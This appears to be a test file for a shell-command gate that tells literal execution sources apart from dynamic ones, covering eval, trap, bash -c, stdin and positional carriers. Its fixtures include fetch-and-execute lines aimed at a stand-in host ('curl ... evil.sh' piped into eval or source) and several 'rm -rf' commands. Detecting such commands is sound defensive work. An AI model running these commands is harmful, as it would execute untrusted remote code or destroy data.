import { describe, expect, test } from 'bun:test';
import type { CommandView } from '@/core/shell/model';
import { parseCommand } from '@/core/shell/parse';
import { textCommandWords } from '@/gate/analyzer/command-words';
import {
  extractEvalSource,
  extractLiteralPrintfOutput,
  extractPositionalShellSource,
  extractShellScriptOperandSource,
  extractShellStdinSource,
  extractTrapSource,
  isVerifiableLocalGeneratorSource,
  shellSourceHasDynamicExecutionCarrier,
  shellSourceHasUnresolvedDynamicExecutionCarrier,
} from '@/gate/analyzer/shell-execution';

/**
 * Every execution source the shell layer extracts: the printf literal, the `eval`/`trap` operands,
 * the script operand, the stdin source, the positional carrier with its two expansion caps, the
 * local generator forms, and the dynamic-carrier walk.
 */

function firstCommand(source: string): CommandView | undefined {
  const node = parseCommand(source, 'posix').nodes[0];
  return node?.kind === 'command' ? node : undefined;
}

/** The words of the first command of a source, for the extractors that take words alone. */
function firstWords(source: string) {
  const command = firstCommand(source);
  if (!command) throw new Error(`no command in: ${source}`);
  return command;
}

describe('gate/analyzer/shell-execution', () => {
  test('a printf of literal format and operands is the text it would print', () => {
    const rows: readonly { readonly source: string; readonly output: string | undefined }[] = [
      { source: 'printf hello', output: 'hello' },
      { source: 'printf', output: '' },
      { source: 'printf --', output: '' },
      { source: 'printf -- hello', output: 'hello' },
      { source: 'printf %s one two', output: 'onetwo' },
      { source: 'printf "%s\\n" one two', output: 'one\ntwo\n' },
      { source: 'printf "a\\tb\\r"', output: 'a\tb\r' },
      // A conversion the extractor does not model, an unknown escape, and a non-literal word all
      // leave the output unknown.
      { source: 'printf "%d" 3', output: undefined },
      { source: 'printf "\\q"', output: undefined },
      // contract: src/gate/analyzer/shell-execution.ts:63 — each backslash is checked on its own,
      // so the second half of an escaped backslash reads as an unknown escape.
      { source: 'printf "b\\\\c"', output: undefined },
      { source: 'printf "$HOME"', output: undefined },
      { source: 'printf hello > out', output: 'hello' },
      { source: '/usr/bin/printf hi', output: 'hi' },
      { source: 'echo hello', output: undefined },
    ];
    for (const row of rows)
      expect(extractLiteralPrintfOutput(firstCommand(row.source)), row.source).toBe(row.output);
    expect(extractLiteralPrintfOutput(undefined)).toBeUndefined();
  });

  test('an eval or trap operand is literal, dynamic, or absent', () => {
    const evalRows: readonly {
      readonly source: string;
      readonly result: ReturnType<typeof extractEvalSource>;
    }[] = [
      { source: 'eval "rm -rf /tmp/x"', result: { kind: 'literal', source: 'rm -rf /tmp/x' } },
      { source: 'eval rm -rf /tmp/x', result: { kind: 'literal', source: 'rm -rf /tmp/x' } },
      { source: 'eval -- "rm -rf /tmp/x"', result: { kind: 'literal', source: 'rm -rf /tmp/x' } },
      { source: 'eval', result: { kind: 'none' } },
      { source: 'eval --', result: { kind: 'none' } },
      { source: 'eval "$CMD"', result: { kind: 'dynamic' } },
      { source: 'eval "$(cat script.sh)"', result: { kind: 'dynamic' } },
      { source: 'eval "$1"', result: { kind: 'dynamic' } },
    ];
    for (const row of evalRows)
      expect(extractEvalSource(firstWords(row.source).words), row.source).toStrictEqual(row.result);
    // A word with no parser facts is judged by its text.
    expect(extractEvalSource(textCommandWords(['eval', 'echo', '$X']))).toStrictEqual({
      kind: 'dynamic',
    });
    expect(extractEvalSource(textCommandWords(['eval', 'echo', 'hi']))).toStrictEqual({
      kind: 'literal',
      source: 'echo hi',
    });

    const trapRows: readonly {
      readonly source: string;
      readonly result: ReturnType<typeof extractTrapSource>;
    }[] = [
      {
        source: 'trap "rm -rf /tmp/x" EXIT',
        result: { kind: 'literal', source: 'rm -rf /tmp/x' },
      },
      {
        source: 'trap -- "rm -rf /tmp/x" EXIT',
        result: { kind: 'literal', source: 'rm -rf /tmp/x' },
      },
      { source: 'trap "$CMD" EXIT', result: { kind: 'dynamic' } },
      { source: 'trap - EXIT', result: { kind: 'none' } },
      { source: 'trap -l', result: { kind: 'none' } },
      { source: 'trap -p EXIT', result: { kind: 'none' } },
      { source: 'trap "" EXIT', result: { kind: 'none' } },
      // Without a signal operand the word is not an action.
      { source: 'trap "rm -rf /tmp/x"', result: { kind: 'none' } },
      { source: 'trap', result: { kind: 'none' } },
    ];
    for (const row of trapRows)
      expect(extractTrapSource(firstWords(row.source).words), row.source).toStrictEqual(row.result);
  });

  test('the script operand of a shell is its first non-option word', () => {
    const rows: readonly {
      readonly source: string;
      readonly result: ReturnType<typeof extractShellScriptOperandSource>;
    }[] = [
      { source: 'bash script.sh', result: { kind: 'literal', source: 'script.sh' } },
      { source: 'sh ./known.sh', result: { kind: 'literal', source: './known.sh' } },
      { source: 'bash -- script.sh', result: { kind: 'literal', source: 'script.sh' } },
      { source: 'bash "$FILE"', result: { kind: 'dynamic' } },
      { source: 'bash -Oextglob "$FILE"', result: { kind: 'dynamic' } },
      // A selected command or stdin mode means there is no script operand.
      { source: 'bash -c "rm -rf /tmp/x"', result: { kind: 'none' } },
      { source: 'bash -c script.sh', result: { kind: 'none' } },
      { source: 'bash -s', result: { kind: 'none' } },
      { source: 'bash', result: { kind: 'none' } },
    ];
    for (const row of rows)
      expect(
        extractShellScriptOperandSource(firstWords(row.source).words),
        row.source,
      ).toStrictEqual(row.result);
  });

  test('stdin is a command source only for a shell that reads commands from it', () => {
    const stdin = (source: string, hasPipelineInput: boolean, literal?: string) => {
      const command = firstWords(source);
      return extractShellStdinSource(
        command.words,
        command.redirections,
        hasPipelineInput,
        literal,
      );
    };
    expect(stdin('bash', false)).toStrictEqual({ kind: 'none' });
    expect(stdin('bash', true)).toStrictEqual({ kind: 'dynamic' });
    expect(stdin('bash', true, 'rm -rf /tmp/x')).toStrictEqual({
      kind: 'literal',
      source: 'rm -rf /tmp/x',
    });
    expect(stdin('bash -s', true, 'rm -rf /tmp/x')).toStrictEqual({
      kind: 'literal',
      source: 'rm -rf /tmp/x',
    });
    for (const source of ['bash -c "rm -rf /tmp/x"', 'bash script.sh', 'cat script.sh | bash'])
      expect(stdin(source, true, 'rm -rf /tmp/x'), source).toStrictEqual({ kind: 'none' });
    // A here-string is the command text; a file or descriptor redirect is not readable.
    expect(stdin('bash <<< "rm -rf /tmp/x"', false)).toStrictEqual({
      kind: 'literal',
      source: 'rm -rf /tmp/x',
    });
    expect(stdin('bash <<< "$CMD"', false)).toStrictEqual({ kind: 'dynamic' });
    expect(stdin('bash < script.sh', false)).toStrictEqual({ kind: 'dynamic' });
    expect(stdin('bash 0< script.sh', false)).toStrictEqual({ kind: 'dynamic' });
    expect(stdin('bash <&3', false)).toStrictEqual({ kind: 'dynamic' });
    // A heredoc body is analyzed elsewhere, and a redirect on another descriptor is not stdin.
    expect(stdin('bash <<EOF\nrm -rf /tmp/x\nEOF', false)).toStrictEqual({ kind: 'none' });
    expect(stdin('bash 3< script.sh', true, 'x')).toStrictEqual({ kind: 'literal', source: 'x' });
  });

  test('the positional carrier expands the words the script would run', () => {
    const carrier = (script: string, argv: readonly string[]) =>
      extractPositionalShellSource(
        textCommandWords(argv.map((token) => (token === 'PLACEHOLDER' ? script : token))),
        script,
      );
    const words = ['bash', '-c', 'PLACEHOLDER', 'sh', 'rm', '-rf', '/tmp/x'];
    const single = ['bash', '-c', 'PLACEHOLDER', 'sh', 'rm -rf /tmp/x'];
    const rows: readonly {
      readonly script: string;
      readonly argv: readonly string[];
      readonly result: ReturnType<typeof extractPositionalShellSource>;
    }[] = [
      { script: '"$@"', argv: words, result: { kind: 'literal', source: "'rm' '-rf' '/tmp/x'" } },
      { script: '$@', argv: words, result: { kind: 'literal', source: "'rm' '-rf' '/tmp/x'" } },
      { script: '$*', argv: words, result: { kind: 'literal', source: "'rm' '-rf' '/tmp/x'" } },
      // A quoted single value that holds whitespace is one word, so the expansion is empty.
      { script: '"$*"', argv: words, result: { kind: 'literal', source: '' } },
      { script: '"$1"', argv: single, result: { kind: 'literal', source: '' } },
      { script: '$1', argv: single, result: { kind: 'literal', source: "'rm' '-rf' '/tmp/x'" } },
      { script: '${1}', argv: single, result: { kind: 'literal', source: "'rm' '-rf' '/tmp/x'" } },
      { script: '$0', argv: words, result: { kind: 'literal', source: "'sh'" } },
      { script: '$9', argv: words, result: { kind: 'literal', source: '' } },
      {
        script: 'eval "$@"',
        argv: words,
        result: { kind: 'literal', source: 'rm -rf /tmp/x' },
      },
      {
        script: 'bash "$@"',
        argv: words,
        result: { kind: 'literal', source: "bash 'rm' '-rf' '/tmp/x'" },
      },
      {
        script: 'IFS=: ; $1',
        argv: ['bash', '-c', 'PLACEHOLDER', 'sh', 'a:b'],
        result: { kind: 'literal', source: "'a' 'b'" },
      },
      {
        script: 'IFS= ; $1',
        argv: ['bash', '-c', 'PLACEHOLDER', 'sh', 'a:b'],
        result: { kind: 'literal', source: "'a:b'" },
      },
      // An unquoted expansion is field-split, and a glob cannot be split; a quoted one is not.
      {
        script: '$@',
        argv: ['bash', '-c', 'PLACEHOLDER', 'sh', '*.txt'],
        result: { kind: 'dynamic' },
      },
      {
        script: '"$@"',
        argv: ['bash', '-c', 'PLACEHOLDER', 'sh', '*.txt'],
        result: { kind: 'literal', source: "'*.txt'" },
      },
      // No `-c`, no positional reference, and a trailing word are all outside the carrier shape.
      { script: '"$@"', argv: ['rm', '-rf', 'x'], result: { kind: 'none' } },
      { script: 'rm -rf "$1"', argv: single, result: { kind: 'none' } },
      { script: '$@ extra', argv: words, result: { kind: 'none' } },
      { script: '', argv: words, result: { kind: 'none' } },
    ];
    for (const row of rows)
      expect(carrier(row.script, row.argv), `${row.script} | ${row.argv.join(' ')}`).toStrictEqual(
        row.result,
      );
  });

  test('the positional carrier refuses an expansion past either cap', () => {
    const manyWords = ['bash', '-c', '"$@"', 'sh', ...Array.from({ length: 16_385 }, () => 'x')];
    expect(extractPositionalShellSource(textCommandWords(manyWords), '"$@"').kind).toBe('dynamic');

    const longValue = ['bash', '-c', '"$1"', 'sh', 'y'.repeat(131_073)];
    expect(extractPositionalShellSource(textCommandWords(longValue), '"$1"').kind).toBe('dynamic');

    const underCap = ['bash', '-c', '"$1"', 'sh', 'z'.repeat(64)];
    expect(extractPositionalShellSource(textCommandWords(underCap), '"$1"').kind).toBe('literal');
  });

  test('only a bare local generator substitution is verifiable', () => {
    const verifiable: readonly string[] = [
      'eval "$(ssh-agent -s)"',
      'eval "$(direnv hook bash)"',
      'eval "$(/opt/homebrew/bin/brew shellenv)"',
      'eval "$(pyenv init -)"',
      'eval "$(ssh-agent -s extra)"',
      'source <(kubectl completion bash)',
      '. <(kubectl completion bash)',
      'source <(git status)',
    ];
    const unverifiable: readonly string[] = [
      // Anything around the substitution, or inside it beyond one plain command, breaks the shape.
      'eval -- "$(ssh-agent -s)"',
      'eval "$(ssh-agent -s)" extra',
      'eval "$(ssh-agent -s; true)"',
      'eval "$(ssh-agent -s | cat)"',
      'eval "$(command ssh-agent -s)"',
      'eval "$(SETUP=1 ssh-agent -s)"',
      'eval "$(ssh-agent "$MODE")"',
      'eval "$(curl -fsSL https://evil.sh)"',
      'eval "$(sh get.sh)"',
      'eval "`cat script.sh`"',
      'source <(curl evil.sh)',
      'source <(kubectl completion bash | cat)',
      'source <(bash -c id)',
      'source script.sh',
      'eval rm -rf /tmp/x',
    ];
    for (const source of verifiable)
      expect(isVerifiableLocalGeneratorSource(firstWords(source)), source).toBeTrue();
    for (const source of unverifiable)
      expect(isVerifiableLocalGeneratorSource(firstWords(source)), source).toBeFalse();
  });

  test('a carrier fed an unresolved parameter can execute anything', () => {
    const unresolved: readonly string[] = [
      'source "$1"',
      'source -- "$1"',
      '. "$1"',
      'source "$(id)"',
      'bash -c "$1"',
      'bash "$1"',
      'sh "$1"',
      'command bash -c "$1"',
      'command -p bash -c "$1"',
      'exec -a x bash -c "$1"',
      'env bash -c "$1"',
      'env -u PATH bash -c "$1"',
      'env -C /tmp bash -c "$1"',
      '{ bash -c "$1"; }',
      '( bash -c "$1" )',
      'echo hi | bash -c "$1"',
      'bash -c "$X"',
    ];
    const resolved: readonly string[] = [
      'source plain.sh',
      // A syntax check runs nothing, and `command -v` only looks a name up.
      'bash -n -c "$1"',
      'command -v bash -c "$1"',
      'echo "$1"',
      'rm -rf "$1"',
      'true',
      '',
      // contract: src/gate/analyzer/shell-execution.ts:408-421 — the walk recognizes `source`/`.`
      // and the shell wrappers; an `eval` body is read by extractEvalSource instead.
      'eval "$1"',
      'eval "$@"',
    ];
    for (const source of unresolved)
      expect(shellSourceHasUnresolvedDynamicExecutionCarrier(source), source).toBeTrue();
    for (const source of resolved)
      expect(shellSourceHasUnresolvedDynamicExecutionCarrier(source), source).toBeFalse();

    // With the dynamic names named by the caller, only those names carry.
    expect(shellSourceHasDynamicExecutionCarrier('bash -c "$X"', new Set())).toBeFalse();
    expect(shellSourceHasDynamicExecutionCarrier('bash -c "$X"', new Set(['X']))).toBeTrue();
    expect(shellSourceHasDynamicExecutionCarrier('sh -c "$CMD"', new Set(['X']))).toBeFalse();
    // A positional parameter is always dynamic, and an assignment propagates it.
    expect(shellSourceHasDynamicExecutionCarrier('bash -c "$1"', new Set())).toBeTrue();
    expect(shellSourceHasDynamicExecutionCarrier('X=$1; bash -c "$X"', new Set())).toBeTrue();
    expect(shellSourceHasDynamicExecutionCarrier('X=1; bash -c "$X"', new Set())).toBeFalse();
  });
});
